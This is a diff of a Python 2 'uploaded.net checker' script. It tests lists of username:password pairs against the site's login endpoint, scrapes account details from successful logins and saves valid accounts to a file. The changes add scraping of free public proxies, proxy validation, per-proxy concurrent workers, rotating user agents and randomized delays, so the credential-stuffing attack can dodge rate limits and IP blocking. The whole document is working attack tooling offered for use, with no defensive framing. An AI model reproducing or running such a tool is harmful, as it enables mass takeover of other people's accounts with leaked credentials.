@@ -2,11 +2,11 @@
 import argparse
 from timeit import default_timer as timer
 import random
+from random import shuffle
 
-import gevent#apt-get install gevent
+import gevent#apt-get install gevent or pip install gevent
 from gevent.queue import *
 import gevent.monkey
-from tqdm import * #pip install tqdm
 import requests #pip install requests
 import cookielib
 from bs4 import BeautifulSoup #pip install BeautifulSoup4
@@ -16,18 +16,14 @@ UL.NET CHECKER - by sup3ria
 print asci
 
 parser = argparse.ArgumentParser(description='uploaded.net checker 2017')
-parser.add_argument('-t','--threads', help='Threads', required=False,type=int,default="5")
 parser.add_argument('-i','--input', help='input.txt', required=False,type=str,default="input.txt")
 parser.add_argument('-o','--output', help='output.txt', required=False,type=str,default="ul_valid.txt")
 parser.add_argument('-s','--sleep', help='Sleeping in between?', required=False,type=bool,default=True)
-parser.add_argument('-v','--valids', help='print valid accounts', required=False,type=bool,default=True)
 
 args = vars(parser.parse_args())
-workers = args['threads']
 file_in  = args['input']
 file_out = args['output']
 sleeper = args['sleep']
-
 
 x = [u'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36', 
 u'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)',
@@ -55,71 +51,129 @@ def parse(html):
     except:
         pass
 
-def sub_worker(task):
-    ua = random.choice(x)
-    jar = cookielib.CookieJar()
-    usr= task.split(':')[0]
-    pwd = task.split(':')[1]
-    s = requests.Session()
-    url = "http://uploaded.net/io/login"
-    q = s.get(url, cookies=jar,headers={'User-Agent': ua,'Accept':'*/*'})
-    data = {'id': usr, 'pw': pwd}
-    r = s.post(url, data=data, cookies=jar,allow_redirects=True,headers={'User-Agent': ua,'Accept':'*/*'})
-    if '{"err":"User and password do not match!"}' not in r.text:
-        g = s.get("http://uploaded.net/me", cookies=jar,headers={'User-Agent': ua,'Accept':'*/*'})
-        data = parse(g.content)
-        return data
-    else:
-        return False
+def sub_worker(task, ip_port):
+    try:
+        ua = random.choice(x)
+        jar = cookielib.CookieJar()
+        usr= task.split(':')[0]
+        pwd = task.split(':')[1]
+        
+        prx = "http://"+ip_port
+        proxies = {'http': prx}
+        s = requests.Session()
+        s.proxies.update(proxies)
+        url = "http://uploaded.net/io/login"
+        l = s.get(url, cookies=jar,headers={'User-Agent': ua,'Accept':'*/*'})
+        data = {'id': usr, 'pw': pwd}
+        r = s.post(url, data=data, cookies=jar,allow_redirects=True,headers={'User-Agent': ua,'Accept':'*/*'})
+        if '{"err":"User and password do not match!"}' not in r.text:
+            g = s.get("http://uploaded.net/me", cookies=jar,headers={'User-Agent': ua,'Accept':'*/*'})
+            data = parse(g.content)
+            return data
+        else:
+            return False
+    except:
+        pass
 
-def worker():
+def get_proxies():
+    r = requests.get('https://free-proxy-list.net/')
+    soup = BeautifulSoup(str(r.text), "lxml")
+    tr = soup.findAll("tr")[1:299]
+    proxies = []
+    for e in tr:
+        soup = BeautifulSoup(str(e), "lxml")
+        td = soup.findAll("td")
+        proxies.append([s.text.strip() for s in td])
+    return [(e[0]+":"+e[1]) for e in proxies]
+
+def prox_check(ip_port):
+	try:
+		prx = "http://"+ip_port
+		proxies = {'http': prx}
+		s = requests.Session()
+		s.proxies.update(proxies)
+		r = s.get("http://api.ipify.org/?format=text", timeout=3)
+		if r.text in prx:
+			r = s.get("http://www.lagado.com/proxy-test", timeout=3)
+			c = r.text.split('<b>Remote &nbsp; IP Address</b>')[1][:14].strip()
+			if ip_port[:9] in c:
+				return True
+		return False
+	except:
+		return False
+            
+def prox_worker():
+    while not q_prox.empty():
+        y = q_prox.get()
+        p = prox_check(y)
+        if p:
+            p = prox_check(y)
+            if p:
+                v_prox.append(y)
+         
+def worker(ip_port):
     while not q.empty():
-        task = q.get()
         try:
-            data = sub_worker(task)
-            if data != False:
+            for i in range(4):
+                gevent.sleep(random.uniform(0.501,0.2983))
+                task = q.get()
+                data = sub_worker(task, ip_port)
                 try:
-                    if data[1].encode('utf-8').strip() == '•••':
-                        line = task+'|'+data[0].encode('utf-8').strip()
+                    if data != False:
+                            if data[1].encode('utf-8').strip() == '•••':
+                                line = task+'|'+data[0].encode('utf-8').strip()
+                            else:
+                                line = task+'|'+data[0].encode('utf-8').strip() +'>'+data[1].encode('utf-8').strip()
+                            with open(file_out, 'a') as f:
+                                print True, line
+                                v.append(line)
+                                f.write(line+'\n')
                     else:
-                        line = task+'|'+data[0].encode('utf-8').strip() +'>'+data[1].encode('utf-8').strip()
-                    with open(file_out, 'a') as f:
-                        v.append(line)
-                        f.write(line+'\n')
+                        print False, task
                 except:
-                    pass
+                    q.put(task)
         finally:
-            pbar.update()
             if sleeper:
-				gevent.sleep(random.uniform(0.201,0.0983))
+                gevent.sleep(random.uniform(8.501,9.0983))
 
 def loader():
     with open(file_in, "r") as text_file:
         for line in text_file:
             try:
                 if len(line.strip()) > 1:
-                    q.put(line.strip(), timeout=10)
+                    q.put(line.strip(), timeout=90)
             except:
                 pass
 
+def asynchronous_prox():
+    p = get_proxies()
+    [q_prox.put(e) for e in p]
+    threads = []
+    print "Checking",len(p),"proxies."
+    for i in xrange(101):
+        threads.append(gevent.spawn(prox_worker))
+    gevent.joinall(threads,raise_error=True)
+    print "Found", len(v_prox), "valid proxies."
+    print "Predicting speed of", len(v_prox)*6, "accounts/min.\n"
+    
 def asynchronous():
     threads = []
-    for i in range(0, workers):
-        threads.append(gevent.spawn(worker))
+    for i in v_prox:
+        threads.append(gevent.spawn(worker, i))
     start = timer()
-    gevent.joinall(threads,raise_error=True)
+    try:
+        gevent.joinall(threads,raise_error=True)
+    except:
+		pass
     end = timer()
-    pbar.close()
     print "\nFound",len(v),"valid account(s)."
-    if args['valids']:
-        print ""
-        for i in v:
-            print i
     print "\n\nTime passed: " + str(end - start)[:6]
 
 gevent.monkey.patch_all()
 v = []
+v_prox = []
+q_prox = gevent.queue.JoinableQueue()
 q = gevent.queue.JoinableQueue()
+asynchronous_prox()
 gevent.spawn(loader).join()
-pbar = tqdm(total=q.qsize())
 asynchronous()
